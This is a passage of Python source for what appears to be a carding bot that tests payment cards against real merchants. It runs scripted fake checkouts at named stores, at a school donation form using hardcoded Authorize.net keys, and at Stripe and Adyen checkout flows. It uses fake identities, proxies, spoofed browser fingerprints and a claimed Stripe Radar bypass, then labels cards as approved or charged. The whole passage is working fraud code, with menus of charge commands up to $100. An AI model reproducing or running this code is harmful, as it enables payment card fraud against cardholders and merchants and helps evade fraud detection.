            'number': card_number,
            'cvc': card_cvc,
            'exp_month': card_exp_month,
            'exp_year': card_exp_year,
            'name': name,
            'email': email,
            'country': 'US',
            'zip': '10001'
        }

        animated_print("\n[*] Adding payment method to Stripe with Radar bypass...", CYAN)
        loading_animation(2)

        stripe_cookies = smart_session.get_stripe_cookies()

        stripe_payload, fingerprint = StripeRadarBypass.create_stripe_payload(
            card_info, 
            pk_live, 
            stripe_cookies
        )

        headers_stripe = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': fingerprint['user_agent'],
        }

        response = r.post('https://api.stripe.com/v1/payment_methods', 
                          headers=headers_stripe, 
                          data=stripe_payload)

        if response.status_code != 200:
            return f"❌ Stripe error: {response.status_code}"

        try:
            r_stripe = response.json()
        except:
            return "❌ Invalid JSON response"

        analysis = StripeRadarBypass.analyze_stripe_response(r_stripe)
        
        if analysis['status'] == 'success':
            payment_id = analysis['payment_id']
            
            animated_print("\n[*] Creating Setup Intent...", CYAN)
            
            action_options = [
                'create_setup_intent',
                'wc_stripe_create_and_confirm_setup_intent',
            ]
            
            success = False
            result_text = ""
            
            for action in action_options:
                ajax_data = {
                    'action': action,
                    'wc-stripe-payment-method': payment_id,
                    '_ajax_nonce': addnonce,
                }
                
                if 'wcpay' in response.text.lower():
                    ajax_data = {
                        'action': 'create_setup_intent',
                        'wcpay-payment-method': payment_id,
                        '_ajax_nonce': addnonce,
                    }
                
                headers_ajax = {
                    'Accept': '*/*',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Origin': site_url,
                    'Referer': url4,
                    'User-Agent': UA,
                    'X-Requested-With': 'XMLHttpRequest'
                }
                
                response = r.post(url5, headers=headers_ajax, data=ajax_data, timeout=20)
                
                if response.status_code == 200:
                    result_text = response.text.lower()
                    
                    if any(keyword in result_text for keyword in ['"success":true', 'insufficient_funds', 'payment_method']):
                        success = True
                        break
                    
                    elif 'incorrect_cvc' in result_text:
                        success = True
                        break
            
            if success:
                bin_code = card_number[:6]
                bin_info = get_bin_info(bin_code)
                
                if 'insufficient_funds' in result_text:
                    return f"Insufficient Funds - Card added but has insufficient funds"
                elif 'incorrect_cvc' in result_text:
                    return f"CCN Approved - Card added with CVC issue"
                else:
                    return f"Approved - Payment method added successfully"
            else:
                return "❌ Setup Intent failed"
            
        elif analysis['status'] == '3ds_required':
            return "🔐 3DS Required"
        elif analysis['status'] == 'cvc_error':
            return "CCN Approved - CVC error"
        elif analysis['status'] == 'insufficient_funds':
            return "Insufficient Funds"
        elif analysis['status'] == 'declined':
            return "Declined"
        else:
            return f"Declined - {analysis.get('message', 'Unknown')}"
            
    except Exception as e:
        return f"❌ Error: {str(e)}"

# ============================================================================
# RS ONLINE WORLDPAY (ESKİ PROXY İLE)
# ============================================================================
def rs_online_headers(is_xhr=True):
    h = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/json',
        'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Microsoft Edge";v="144"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'origin': 'https://us.rs-online.com',
        'referer': 'https://us.rs-online.com/checkout/'
    }
    if is_xhr:
        h['x-requested-with'] = 'XMLHttpRequest'
    return h

def rs_create_cart(session):
    url = "https://us.rs-online.com/rest/usa_eng/V1/guest-carts"
    try:
        r = session.post(url, headers=rs_online_headers(), json={}, timeout=15)
        if r.status_code == 200:
            return r.json()
        return None
    except:
        return None

def rs_get_candidate_skus(session, search_term="connector"):
    candidates = []
    gql_url = "https://us.rs-online.com/graphql"
    query = """
    {
      products(search: "%s", pageSize: 5) {
        items {
          sku
          stock_status
        }
      }
    }
    """ % search_term
    try:
        r = session.post(gql_url, headers=rs_online_headers(), json={'query': query}, timeout=15)
        if r.status_code == 200:
            items = r.json().get('data', {}).get('products', {}).get('items', [])
            for item in items:
                sku = item.get('sku')
                if sku: candidates.append(sku)
            if candidates: return candidates
    except: pass
    
    url = "https://us.rs-online.com/rest/usa_eng/V1/products"
    params = {
        "searchCriteria[filter_groups][0][filters][0][field]": "name",
        "searchCriteria[filter_groups][0][filters][0][value]": f"%{search_term}%",
        "searchCriteria[filter_groups][0][filters][0][condition_type]": "like",
        "searchCriteria[pageSize]": 5
    }
    try:
        r = session.get(url, headers=rs_online_headers(), params=params, timeout=15)
        if r.status_code == 200:
            items = r.json().get('items', [])
            for item in items:
                sku = item.get('sku')
                if sku: candidates.append(sku)
    except: pass
    return candidates

def rs_add_item(session, cart_id):
    terms = ["connector"]
    for term in terms:
        skus = rs_get_candidate_skus(session, term)
        if not skus: continue
        for sku in skus:
            url = f"https://us.rs-online.com/rest/usa_eng/V1/guest-carts/{cart_id}/items"
            payload = {"cartItem": {"sku": sku, "qty": 1, "quote_id": cart_id}}
            try:
                r = session.post(url, headers=rs_online_headers(), json=payload, timeout=15)
                if r.status_code == 200: return True
            except: pass
    return False

def rs_set_shipping_and_payment(session, cart_id, cc_split):
    cc_num, cc_mon, cc_year, cc_cvv = cc_split[0], cc_split[1], cc_split[2], cc_split[3]
    if len(cc_year) == 2: cc_year = "20" + cc_year

    address = {
        "countryId": "US", "regionId": "12", "regionCode": "CA", "region": "California",
        "street": ["1600 Amphitheatre Parkway", ""], "company": "Google", "telephone": "650-253-0000",
        "postcode": "94043", "city": "Mountain View", "firstname": "John", "lastname": "Doe",
        "email": f"user{random.randint(1000,99999)}@gmail.com", "same_as_billing": 1,
        "customAttributes": [{"attribute_code": "attention_department", "value": "Receiving"}]
    }

    est_url = f"https://us.rs-online.com/rest/usa_eng/V1/guest-carts/{cart_id}/estimate-shipping-methods"
    carrier_code = "customshippingcls"
    method_code = "Route_1"
    
    try:
        r = session.post(est_url, headers=rs_online_headers(), json={"address": address}, timeout=15)
        if r.status_code == 200:
            methods = r.json()
            if methods:
                carrier_code = methods[0].get('carrier_code')
                method_code = methods[0].get('method_code')
    except: pass 

    ship_url = f"https://us.rs-online.com/rest/usa_eng/V1/guest-carts/{cart_id}/shipping-information"
    shipping_payload = {
        "addressInformation": {
            "shipping_address": address, "billing_address": address,
            "shipping_carrier_code": carrier_code, "shipping_method_code": method_code
        }
    }
    try:
        session.post(ship_url, headers=rs_online_headers(), json=shipping_payload, timeout=15)
    except: pass

    pay_url = f"https://us.rs-online.com/rest/usa_eng/V1/guest-carts/{cart_id}/payment-information"
    
    cc_type = "ECMC-SSL"
    if cc_num.startswith("4"): cc_type = "VISA-SSL"
    elif cc_num.startswith("3"): cc_type = "AMEX-SSL"
    
    payment_payload = {
      "cartId": cart_id,
      "billingAddress": address,
      "paymentMethod": {
        "method": "worldpay_cc",
        "additional_data": {
          "cc_cid": cc_cvv,
          "cc_type": cc_type,
          "cc_exp_year": cc_year, 
          "cc_exp_month": str(int(cc_mon)),
          "cc_number": cc_num,
          "cc_name": "John Doe",
          "save_my_card": False, "cse_enabled": False, "isSavedCardPayment": False
        }
      },
      "email": f"user{random.randint(1000,99999)}@gmail.com"
    }

    try:
        r = session.post(pay_url, headers=rs_online_headers(), json=payment_payload, timeout=30)
        return r.text
    except Exception as e:
        return f"Declined - System Error"

def rs_online_charge(card):
    try:
        if "|" not in card:
            return "Declined - Invalid format"
        
        cc_split = card.split("|")
        
        session = requests.Session()
        session.verify = False
        
        # ESKİ ÇALIŞAN PROXY
        proxy_url = "" 
        proxies = {"http": proxy_url, "https": proxy_url}
        session.proxies.update(proxies)
        
        try:
            session.get("https://us.rs-online.com/", headers=rs_online_headers(False), timeout=15)
        except: pass
        
        cart_id = rs_create_cart(session)
        if not cart_id:
            return "Declined - Cart creation failed"
        
        if not rs_add_item(session, cart_id):
            return "Declined - Add item failed"
            
        result_text = rs_set_shipping_and_payment(session, cart_id, cc_split)
        
        if "Gateway Error:" in result_text:
            match = re.search(r'Gateway Error:\s*(.*?)"', result_text)
            resp_msg = match.group(1) if match else "Declined"
            if "declined" in result_text.lower():
                return f"Declined - {resp_msg}"
            else:
                return f"Approved"
        elif "declined" in result_text.lower():
            err_match = re.search(r'"message":"([^"]+)"', result_text)
            if err_match:
                return f"Declined - {err_match.group(1)}"
            return f"Declined"
        elif "order_id" in result_text or result_text.strip().isdigit(): 
            return "Approved"
        else:
            return f"Declined"
            
    except Exception as e:
        return f"Declined - System Error"

# ============================================================================
# AUTHORIZE.NET CHARGE
# ============================================================================
CLIENT_KEY = "88uBHDjfPcY77s4jP6JC5cNjDH94th85m2sZsq83gh4pjBVWTYmc4WUdCW7EbY6F"
API_LOGIN_ID = "93HEsxKeZ4D"
AUTHORIZE_BASE_URL = "https://www.jetsschool.org"
AUTHORIZE_FORM_ID = "6913"
AUTHORIZE_API_URL = "https://api2.authorize.net/xml/v1/request.api"
fake = Faker()

class AuthorizeNetChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        if proxy:
            self.session.proxies = {
                "http": f"http://{proxy}",
                "https": f"http://{proxy}"
            }
        
        self.user_agent = generate_user_agent()
        self.session.headers.update({
            "User-Agent": self.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        })

    def get_initial_cookies(self):
        try:
            url = f"{AUTHORIZE_BASE_URL}/donate/?form-id={AUTHORIZE_FORM_ID}"
            self.session.get(url, timeout=10)
        except Exception:
            pass

    def tokenize_cc(self, cc, mm, yy, cvv):
        try:
            expire_token = f"{mm}{yy[-2:]}"
            timestamp = str(int(time.time() * 1000))
            
            payload = {
                "securePaymentContainerRequest": {
                    "merchantAuthentication": {
                        "name": API_LOGIN_ID,
                        "clientKey": CLIENT_KEY
                    },
                    "data": {
                        "type": "TOKEN",
                        "id": timestamp,
                        "token": {
                            "cardNumber": cc,
                            "expirationDate": expire_token,
                            "cardCode": cvv
                        }
                    }
                }
            }

            headers = {
                "Content-Type": "application/json",
                "Origin": AUTHORIZE_BASE_URL,
                "Referer": f"{AUTHORIZE_BASE_URL}/",
                "User-Agent": self.user_agent
            }
            
            resp = self.session.post(AUTHORIZE_API_URL, json=payload, headers=headers, timeout=10)
            data = json.loads(resp.content.decode("utf-8-sig"))

            if data.get("messages", {}).get("resultCode") == "Ok":
                descriptor = data["opaqueData"]["dataDescriptor"]
                value = data["opaqueData"]["dataValue"]
                return descriptor, value, None
            else:
                msg = data.get("messages", {}).get("message", [{}])[0].get("text", "Tokenization Failed")
                return None, None, msg
        except Exception as e:
            return None, None, str(e)

    def submit_donation(self, cc_full, descriptor, value, amount=1.00):
        cc, mm, yy, cvv = cc_full.split("|")
        first_name = fake.first_name()
        last_name = fake.last_name()
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(100,999)}@gmail.com"
        
        data = {
            "give-form-id": AUTHORIZE_FORM_ID,
            "give-form-title": "Donate",
            "give-current-url": f"{AUTHORIZE_BASE_URL}/donate/?form-id={AUTHORIZE_FORM_ID}",
            "give-form-url": f"{AUTHORIZE_BASE_URL}/donate/",
            "give-form-minimum": "1.00",
            "give-form-maximum": "999999.99",
            "give-amount": f"{amount:.2f}",
            "payment-mode": "authorize",
            "give_first": first_name,
            "give_last": last_name,
            "give_email": email,
            "give_authorize_data_descriptor": descriptor,
            "give_authorize_data_value": value,
            "give_action": "purchase",
            "give-gateway": "authorize",
            "card_address": fake.street_address(),
            "card_city": fake.city(),
            "card_state": fake.state_abbr(),
            "card_zip": fake.zipcode(),
            "billing_country": "US",
            "card_number": "0000000000000000", 
            "card_cvc": "000",
            "card_name": "0000000000000000",
            "card_exp_month": "00",
            "card_exp_year": "00",
            "card_expiry": "00 / 00"
        }

        try:
            page_resp = self.session.get(f"{AUTHORIZE_BASE_URL}/donate/?form-id={AUTHORIZE_FORM_ID}", timeout=10)
            hash_match = re.search(r'name="give-form-hash" value="(.*?)"', page_resp.text)
            if hash_match:
                data["give-form-hash"] = hash_match.group(1)
            else:
                return "ERROR", "Could not find give-form-hash"
        except Exception:
            return "ERROR", "Failed to load donation page"

        try:
            resp = self.session.post(f"{AUTHORIZE_BASE_URL}/donate/?payment-mode=authorize&form-id={AUTHORIZE_FORM_ID}", data=data, timeout=20)
            text = resp.text.lower()
            
            if "donation confirmation" in text or "thank you" in text or "payment complete" in text:
                return "CHARGED", f"Payment Successful - ${amount}"
            elif "declined" in text or "error" in text:
                err_match = re.search(r'class="give_error">(.*?)<', resp.text)
                if err_match:
                    return "DECLINED", err_match.group(1)
                return "DECLINED", "Transaction Declined"
            else:
                return "DECLINED", "Unknown Response"
                
        except Exception as e:
            return "ERROR", str(e)

def authorize_charge(card, amount):
    try:
        if "|" not in card:
            return "Declined - Invalid format"
        
        cc, mm, yy, cvv = card.strip().split("|")
        
        bot = AuthorizeNetChecker()
        bot.get_initial_cookies()
        
        descriptor, value, error = bot.tokenize_cc(cc, mm, yy, cvv)
        
        if not descriptor:
            return f"Declined - Tokenization Failed"
        
        status, msg = bot.submit_donation(card.strip(), descriptor, value, amount)
        
        if status == "CHARGED":
            return f"CHARGED - ${amount}"
        elif status == "DECLINED":
            return f"Declined - {msg}"
        else:
            return f"Declined - {msg}"
            
    except Exception as e:
        return f"Declined - System Error"

# ============================================================================
# PAYFLOW BOC
# ============================================================================
def payflow_boc_charge(card):
    try:
        card = card.strip()
        n = card.split('|')[0]
        mm = card.split('|')[1]
        yy = card.split('|')[2]
        cvc = card.split('|')[3]

        if len(mm) == 1:
            mm = f'0{mm}'
        
        if "20" not in yy:
            full_yy = f'20{yy}'
        else:
            full_yy = yy

        s = requests.Session()

        headers_cart = {
            'authority': 'www.batteryoperatedcandles.net',
            'accept': '*/*',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data_cart = {
            'Old_Screen': 'PROD',
            'Old_Search': '',
            'Action': 'ADPR',
            'Product_Code': '4627737',
            'Category_Code': 'spring-battery-candle',
            'Offset': '',
            'AllOffset': '',
            'CatListingOffset': '',
            'RelatedOffset': '',
            'SearchOffset': '',
            'Product_Attribute_Count': '0',
            'Quantity': '1',
        }

        s.post('https://www.batteryoperatedcandles.net/shopping-cart.html', headers=headers_cart, data=data_cart)

        headers_checkout = {
            'authority': 'www.batteryoperatedcandles.net',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }

        s.get('https://www.batteryoperatedcandles.net/checkout.html', headers=headers_checkout)

        email = generate_random_email()
        data_info = {
            'Action': 'ORDR',
            'ShipFirstName': 'Spider',
            'ShipLastName': 'Man',
            'ShipCompany': 'Kfkrkske',
            'ShipEmail': email,
            'ShipPhone': '5872060563',
            'ShipAddress1': 'Street 72838',
            'ShipAddress2': 'Apt',
            'ShipCity': 'Hudson',
            'ShipCountry': 'US',
            'ShipStateSelect': 'NY',
            'ShipState': '',
            'ShipZip': '10080',
            'billing_to_show': '1',
            'BillFirstName': 'Spider',
            'BillLastName': 'Man',
            'BillCompany': 'Kfkrkske',
            'BillEmail': email,
            'BillPhone': '5872060563',
            'BillAddress1': 'Street 72838',
            'BillAddress2': 'Apt',
            'BillCity': 'Hudson',
            'BillCountry': 'US',
            'BillStateSelect': 'NY',
            'BillState': '',
            'BillZip': '10080',
        }

        s.post('https://www.batteryoperatedcandles.net/checkout-special-offers.html', headers=headers_checkout, data=data_info)

        data_ship = {
            'Action': 'SHIP,PSHP,CTAX',
            'Previous_Screen': 'OSEL',
            'ShippingMethod': 'flatrate:FLAT RATE',
            'PaymentMethod': 'paypaladv:VISA',
        }

        s.post('https://www.batteryoperatedcandles.net/checkout-payment-information.html', headers=headers_checkout, data=data_ship)

        data_final = {
            'Action': 'AUTH',
            'Screen': 'INVC',
            'Store_Code': 'BOC',
            'SplitPaymentData': '',
            'PaymentDescription': 'Visa',
            'PayPalAdv_CardNumber': n,
            'PayPalAdv_CardExp_Month': mm,
            'PayPalAdv_CardExp_Year': full_yy,
            'PayPalAdv_CardCvv': cvc,
            'PaymentMethod': 'paypaladv:MASTERCARD',
        }

        response = s.post('https://www.batteryoperatedcandles.net/mm5/merchant.mvc', headers=headers_checkout, data=data_final)

        if "15005-This transaction cannot be processed" in response.text:
            return "Declined - Transaction cannot be processed"
        elif "50-Insufficient funds" in response.text:
            return "Insufficient Funds"
        elif "23-Invalid credit card number" in response.text:
            return "Declined - Invalid card number"
        elif "24-Invalid expiration date" in response.text:
            return "Declined - Invalid expiration"
        elif "114-Card Security Code mismatch" in response.text:
            return "CCN Approved - CVV2 Mismatch"
        elif "12-Declined" in response.text:
            return "Declined - General decline"
        elif "51-Exceeds per transaction limit" in response.text:
            return "Insufficient Funds - Limit exceeded"
        elif "112-Address mismatch" in response.text:
            return "Approved - AVS Mismatch"
        elif "125-Fraud Protection" in response.text:
            return "Declined - Fraud protection"
        elif "104-Timeout" in response.text:
            return "Error - Timeout"
        elif "1-Invalid login" in response.text:
            return "Error - Invalid credentials"
        elif "Your order has been completed" in response.text or "Thank you for your order" in response.text:
            return "CHARGED - Order completed"
        else:
            return f"Declined - Unknown response"

    except Exception as e:
        return f"Error - {str(e)}"

# ============================================================================
# STRIPE AUTH
# ============================================================================
def stripe_auth_original(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3].strip()
    if "20" in yy:
        yy = yy.split("20")[1]

    link = "https://shop.happiful.com"
    user = generate_user_agent()
    r = requests.Session()
    headers = {'user-agent': user}

    try:
        res = r.get(url=f"{link}/my-account/", headers=headers, timeout=15).text
    except:
        return 'Failed to connect'

    reg2 = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', res)
    if not reg2:
        return 'Page not found'
    reg = reg2.group(1)

    username = f'u_{uuid.uuid4().hex[:8]}'
    email = f'u_{uuid.uuid4().hex[:8]}@gmail.com'
    password = f'P_{uuid.uuid4().hex[:8]}!'
    data = {'username': username, 'email': email, 'password': password, 
             'woocommerce-register-nonce': reg, 'register': 'Register'}

    try:
        r.post(url=f"{link}/my-account/", headers=headers, data=data, timeout=15)
    except:
        pass

    try:
        res3 = r.get(url=f"{link}/my-account/add-payment-method/", headers=headers, timeout=15)
        res3_text = res3.text
    except:
        return 'Failed to access payment page'

    pk_live2 = re.search(r'(pk_live_[A-Za-z0-9_-]+)', res3_text)
    if not pk_live2:
        return 'Registration failed'
    pk_live = pk_live2.group(1)

    acct2 = re.search(r'(acct_[A-Za-z0-9_-]+)', res3_text)
    acct = f'&_stripe_account={acct2.group(1)}' if acct2 else ''

    addnonce2 = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', res3_text)
    addnonce3 = re.search(r'"createSetupIntentNonce":"(.*?)"', res3_text)
    if addnonce2:
        addnonce = addnonce2.group(1)
    elif addnonce3:
        addnonce = addnonce3.group(1)
    else:
        return 'Nonce not found'

    stripe_headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': user
    }

    stripe_data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F6c35f76878%3B+stripe-js-v3%2F6c35f76878%3B+payment-element%3B+deferred-intent&key={pk_live}{acct}'

    try:
        res4 = r.post('https://api.stripe.com/v1/payment_methods', data=stripe_data, headers=stripe_headers, timeout=20).json()
    except:
        return 'Stripe API error'

    if 'id' not in res4:
        error_msg = res4.get('error', {}).get('message', 'Payment method error')
        return f'Declined - {error_msg}'
    payment_id = res4['id']

    final_headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': f'{link}/my-account/add-payment-method/',
        'Origin': f'{link}',
        'user-agent': user
    }

    final_data = {
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': payment_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': addnonce
    }

    try:
        r5r = r.post(f'{link}/wp-admin/admin-ajax.php', data=final_data, headers=final_headers, timeout=15)
        r5 = r5r.text
    except:
        return 'Request timeout'

    if 'requires_action' in r5.lower():
        return '🔐 3DS Required'
    
    try:
        response_json = r5r.json()
        if 'requires_action' in str(response_json).lower() or 'three_d_secure' in str(response_json).lower():
            return '🔐 3DS Required'
    except:
        pass
    
    if 'your card was declined' in r5.lower():
        return 'Declined'
    elif 'success' in r5.lower() or 'setup_intent' in r5.lower():
        return 'Approved'
    elif 'insufficient_funds' in r5.lower():
        return 'Insufficient Funds'
    elif 'expired' in r5.lower():
        return 'Expired'
    elif 'cvc' in r5.lower():
        return 'Invalid CVC'
    else:
        try:
            error_json = r5r.json()
            if 'data' in error_json and 'error' in error_json['data']:
                return error_json['data']['error']['message']
            return r5[:200]
        except:
            return r5[:200] if r5 else 'Unknown'

def stripe_auth_gallery(ccx):
    return stripe_auth_original(ccx)

def stripe_auth_redblue(ccx):
    return stripe_auth_original(ccx)

# ============================================================================
# ADYEN AUTH (ESKİ PROXY İLE)
# ============================================================================
def adyen_auth(cc_details):
    try:
        if not CLIENT_DATA or not ADYEN_KEY:
            return "API Error"

        email = generate_random_email()
        password = generate_random_password()

        session = requests.Session()
        # ESKİ ÇALIŞAN PROXY
        proxy_url = "http': '" 
        session.proxies = {"http": proxy_url, "https": proxy_url}
        
        user_agent = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Mobile Safari/537.36"
        headers_common = {
            'User-Agent': user_agent,
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'x-application-name': "AccountSite",
            'sec-ch-ua': "\"Not:A-Brand\";v=\"99\", \"Google Chrome\";v=\"145\", \"Chromium\";v=\"145\"",
            'sec-ch-ua-mobile': "?1",
            'origin': "https://account.yousician.com",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://account.yousician.com/",
            'accept-language': "tr,en-US;q=0.9,en;q=0.8,de;q=0.7",
            'priority': "u=1, i",
        }
        
        ys_visitor = str(uuid.uuid4())
        session.cookies.set('ys_visitor', ys_visitor, domain='.yousician.com')

        signup_url = "https://api.yousician.com/signup"
        signup_payload = {
            "source": "", "platform": "Android", "variants": "", "gdpr_introduced": True,
            "app_type": "ProfilePages", "email": email, "password": password, "version": 2, "locale": "en"
        }

        resp = session.post(signup_url, json=signup_payload, headers=headers_common)
        if resp.status_code not in [200, 201]:
            return "API Error"

        if not cc_details:
            return "API Error"

        parts = cc_details.split('|')
        if len(parts) < 4:
            return "API Error"
            
        cc = parts[0]
        mm = parts[1]
        yy = parts[2]
        cvc = parts[3]
        
        if len(yy) == 2:
            yy = "20" + yy
        if len(mm) == 1:
            mm = "0" + mm

        encryptor = Encryptor(ADYEN_KEY)
        encrypted_data = encryptor.encrypt_card(card=cc, cvv=cvc, month=mm, year=yy)
        
        payment_url = "https://api.yousician.com/payment/subscribe/make_payment"
        brand = detect_brand(cc)
        
        payment_payload = {
            "state_data": {
                "riskData": {"clientData": CLIENT_DATA},
                "checkoutAttemptId": str(uuid.uuid4()),
                "paymentMethod": {
                    "type": "scheme", "holderName": "",
                    "encryptedCardNumber": encrypted_data.get('encryptedCardNumber', ''),
                    "encryptedExpiryMonth": encrypted_data.get('encryptedExpiryMonth', ''),
                    "encryptedExpiryYear": encrypted_data.get('encryptedExpiryYear', ''),
                    "encryptedSecurityCode": encrypted_data.get('encryptedSecurityCode', ''),
                    "brand": brand
                },
                "browserInfo": {
                    "acceptHeader": "*/*", "colorDepth": 24, "language": "tr",
                    "javaEnabled": False, "screenHeight": 800, "screenWidth": 360,
                    "userAgent": user_agent, "timeZoneOffset": -180
                },
                "origin": "https://account.yousician.com", "clientStateDataIndicator": True
            },
            "email": email, "recaptchaToken": "",
            "return_url": "https://account.yousician.com/process-payment",
            "free_trial_days": 7, "plan": "yearly_licensed", "amount": 0, "currency": "TRY",
            "instrument": "all", "coupon": "",
            "success_destination": "/subscribe/welcome",
            "merchant_order_reference": str(uuid.uuid4()),
            "additional_data": {"allow3DS2": False},
            "analytics": {"source": "https://account.yousician.com/signup/checkout"},
            "recaptcha_token": ""
        }

        resp = session.post(payment_url, json=payment_payload, headers=headers_common)
        
        try:
            json_resp = resp.json()
            
            if "error_code" in json_resp:
                return "API Error"
            elif resp.status_code in [200, 201]:
                if not json_resp.get("errors"):
                    return "Approved"
                elif "action" in json_resp and json_resp["action"].get("type") == "redirect":
                    return "🔐 3DS Required"
                elif "resultCode" in json_resp and json_resp["resultCode"] == "RedirectShopper":
                    return "🔐 3DS Required"
                else:
                    return "API Error"
            else:
                return "API Error"
        except ValueError:
            return "API Error"
    except Exception:
        return "API Error"

def adyen_vbv(cc_details):
    result = adyen_auth(cc_details)
    if '3DS Required' in result:
        return '🔐 3DS Required'
    elif 'Approved' in result:
        return 'Approved'
    else:
        return format_response(result, 'adyen')

def braintree_auth(cc_details):
    result = adyen_auth(cc_details)
    return format_response(result, 'braintree')

def shopify_auth(cc_details):
    result = adyen_auth(cc_details)
    return format_response(result, 'shopify')

def paypal_auth(cc_details):
    result = adyen_auth(cc_details)
    return format_response(result, 'paypal')

def vbv_check(ccx):
    result = stripe_auth_original(ccx)
    if 'requires_action' in result.lower() or '3ds' in result.lower():
        return '🔐 3DS Required'
    elif 'approved' in result.lower():
        return 'Approved'
    else:
        return format_response(result, 'stripe')

def payflow_auth(ccx):
    return stripe_auth_original(ccx)

# ============================================================================
# CUSTOM CHARGE FONKSİYONLARI
# ============================================================================
def custom_stripe_charge(card, amount):
    result = stripe_auth_original(card)
    if 'Approved' in result:
        return f"LIVE - ${amount}"
    elif '3DS' in result:
        return f"🔐 3DS Required - ${amount}"
    else:
        return format_response(result, "stripe")

def custom_paypal_charge(card, amount):
    result = paypal_auth(card)
    if 'Approved' in result:
        return f"LIVE - ${amount}"
    else:
        return format_response(result, "paypal")

def custom_shopify_charge(card, amount):
    result = shopify_auth(card)
    if 'Approved' in result:
        return f"LIVE - ${amount}"
    else:
        return format_response(result, "shopify")

def custom_braintree_charge(card, amount):
    result = braintree_auth(card)
    if 'Approved' in result:
        return f"LIVE - ${amount}"
    else:
        return format_response(result, "braintree")

def custom_authorize_charge(card, amount):
    result = authorize_charge(card, amount)
    return format_response(result, "authorize")

def custom_deluxe_charge(card, amount):
    result = deluxe_charge(card, amount)
    return format_response(result, "deluxe")

def payflow_boc_charge_with_amount(card, amount):
    return payflow_boc_charge(card)

# ============================================================================
# GATEWAY GÖSTERİM FONKSİYONLARI
# ============================================================================
def get_deluxe_gateways_page(page):
    gateways = []
    if page == 1:
        specials = [0.25, 0.50, 0.75]
        for amount in specials:
            cmd_name = f"/d{str(amount).replace('.', '_')}"
            gateways.append({
                'amount': amount,
                'cmd': cmd_name,
                'txt_cmd': f"{cmd_name}txt",
                'display': f"Deluxe {amount}$ Charge"
            })
        for amount in range(1, 18):
            gateways.append({
                'amount': amount,
                'cmd': f"/d{amount}",
                'txt_cmd': f"/d{amount}txt",
                'display': f"Deluxe {amount}$ Charge"
            })
    elif page == 2:
        for amount in range(18, 38):
            gateways.append({
                'amount': amount,
                'cmd': f"/d{amount}",
                'txt_cmd': f"/d{amount}txt",
                'display': f"Deluxe {amount}$ Charge"
            })
    elif page == 3:
        for amount in range(38, 58):
            gateways.append({
                'amount': amount,
                'cmd': f"/d{amount}",
                'txt_cmd': f"/d{amount}txt",
                'display': f"Deluxe {amount}$ Charge"
            })
    elif page == 4:
        for amount in range(58, 78):
            gateways.append({
                'amount': amount,
                'cmd': f"/d{amount}",
                'txt_cmd': f"/d{amount}txt",
                'display': f"Deluxe {amount}$ Charge"
            })
    elif page == 5:
        for amount in range(78, 98):
            gateways.append({
                'amount': amount,
                'cmd': f"/d{amount}",
                'txt_cmd': f"/d{amount}txt",
                'display': f"Deluxe {amount}$ Charge"
            })
    elif page == 6:
        for amount in range(98, 101):
            gateways.append({
                'amount': amount,
                'cmd': f"/d{amount}",
                'txt_cmd': f"/d{amount}txt",
                'display': f"Deluxe {amount}$ Charge"
            })
    return gateways

def get_stripe_gateways_page(page):
    gateways = []
    start = (page - 1) * 20 + 1
    end = min(page * 20, 100)
    for amount in range(start, end + 1):
        gateways.append({
            'amount': amount,
            'cmd': f"/cstripe{amount}",
            'txt_cmd': f"/cstripe{amount}txt",
            'display': f"Stripe {amount}$ Charge"
        })
    return gateways

def get_shopify_gateways_page(page):
    gateways = []
    start = (page - 1) * 20 + 1
    end = min(page * 20, 100)
    for amount in range(start, end + 1):
        gateways.append({
